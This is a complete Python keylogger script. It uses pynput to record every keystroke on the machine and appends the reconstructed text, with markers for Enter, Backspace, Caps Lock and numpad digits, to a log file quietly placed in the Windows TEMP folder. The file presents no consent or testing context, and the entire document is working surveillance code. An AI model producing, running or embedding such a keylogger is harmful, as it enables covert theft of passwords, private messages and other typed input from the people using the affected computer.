import os
from pynput.keyboard import Key, Listener

# Get the system temp folder dynamically
temp_path = os.path.join(os.environ["TEMP"])
log_file = os.path.join(temp_path, "log.txt")

pressed_keys = set()  # Track currently pressed keys
backspace_held = False  # Track if Backspace is held


def write_to_file(key, backspace_on_press=False):
    key = str(key).replace("'", "")

    special_keys = {
        'Key.space': " ",
        'Key.enter': "[ENTER]\n",
        'Key.tab': "\t",
        'Key.caps_lock': "[CAPSLOCK]",
        '<96>': "0", '<97>': "1", '<98>': "2", '<99>': "3",
        '<100>': "4", '<101>': "5", '<102>': "6", '<103>': "7",
        '<104>': "8", '<105>': "9"
    }

    with open(log_file, "a") as f:
        if key == 'Key.backspace':
            if backspace_on_press:
                f.write("[BACKonPRESS]")
            else:
                f.write("[BACKSPACE]")
        elif key in special_keys:
            f.write(special_keys[key])
        elif "Key." not in key:  # Ignore other special keys like shift, ctrl, arrows
            f.write(key)


def on_press(key):
    global backspace_held

    if key == Key.backspace:
        if key in pressed_keys:  # Key is being held down
            if not backspace_held:
                write_to_file(key, backspace_on_press=True)
                backspace_held = True  # Mark that [BACKonPRESS] was written
        else:  # Normal press
            write_to_file(key, backspace_on_press=False)
    elif key == Key.caps_lock:  # Log Caps Lock press
        write_to_file(key)
    elif key not in pressed_keys:  # Only log other keys if first press
        write_to_file(key)

    pressed_keys.add(key)  # Mark key as pressed


def on_release(key):
    global backspace_held

    if key in pressed_keys:
        pressed_keys.remove(key)

    if key == Key.backspace:
        backspace_held = False  # Reset when Backspace is released


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
